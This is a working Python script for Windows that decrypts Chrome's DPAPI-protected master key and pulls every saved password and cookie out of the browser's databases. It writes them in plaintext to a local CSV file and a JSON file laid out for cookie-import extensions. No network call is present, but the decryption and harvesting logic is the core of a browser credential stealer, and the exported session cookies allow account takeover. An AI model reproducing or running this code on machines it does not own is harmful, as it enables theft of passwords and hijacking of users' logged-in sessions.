import os
import json
import base64
import sqlite3
import shutil
import csv
from datetime import datetime, timedelta

# Dependencies: pip install pywin32 pycryptodomex
import win32crypt
from Cryptodome.Cipher import AES

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            # print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"],
                                    "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        print(f"Error: Local State file not found at {local_state_path}")
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # print("Decryption failed")
            return ""

def export_passwords(key, output_file):
    db_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(db_path):
        # Try Profile 1 if Default doesn't exist/has no data, but let's stick to Default for now or check both.
        print(f"Login Data db not found at {db_path}")
        return

    filename = "ChromeData_LoginInput.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    print(f"Exporting Passwords to {output_file}...")
    
    with open(output_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["name", "url", "username", "password"])
        
        count = 0
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_data(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            
            if username or password:
                writer.writerow(["", origin_url, username, password])
                count += 1
                
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    print(f"Exported {count} passwords.")

def export_cookies(key, output_file):
    db_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.exists(db_path):
        # Old path
        db_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Cookies")
    
    if not os.path.exists(db_path):
        print(f"Cookies db not found at {db_path}")
        return

    filename = "ChromeData_CookiesInput.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    # query for cookies
    # J2TEAM Cookies/EditThisCookie format is typically a list of JSON objects
    cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, encrypted_value, samesite, source_scheme FROM cookies")

    cookies = []
    
    print(f"Exporting Cookies to {output_file}...")
    
    count = 0
    for row in cursor.fetchall():
        host_key = row[0]
        name = row[1]
        path = row[3]
        is_secure = bool(row[5])
        is_httponly = bool(row[6])
        encrypted_value = row[11]
        
        decrypted_value = decrypt_data(encrypted_value, key)
        if not decrypted_value:
             # Fallback to plain value if encryption empty (rare)
             decrypted_value = row[2]

        # Construct JSON object compatible with import tools (e.g. EditThisCookie or J2TEAM)
        # This is a generic JSON schema for cookies
        cookie = {
            "domain": host_key,
            "hostOnly": host_key.startswith('.'), # rough approximation
            "httpOnly": is_httponly,
            "name": name,
            "path": path,
            "sameSite": "no_restriction" if row[12] == 0 else ("lax" if row[12] == 1 else "strict"),
            "secure": is_secure,
            "session": not bool(row[8]), # has_expires
            "storeId": "0",
            "value": decrypted_value,
            "id": count + 1
        }
        
        # Expiration
        if row[8]: # has_expires
             # expires_utc
             expire_seconds = row[4] / 1000000 - 11644473600
             cookie["expirationDate"] = expire_seconds

        cookies.append(cookie)
        count += 1

    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(cookies, f, indent=4)
        
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    print(f"Exported {count} cookies.")

def main():
    try:
        key = get_encryption_key()
        if not key:
            print("Could not retrieve encryption key.")
            return

        export_passwords(key, "passwords.csv")
        export_cookies(key, "cookies.json")
        print("\nSUCCESS: Secrets exported successfully.")
    except Exception as e:
        print(f"\nCRITICAL ERROR: {e}")
        input("Press Enter to continue...")

if __name__ == "__main__":
    main()
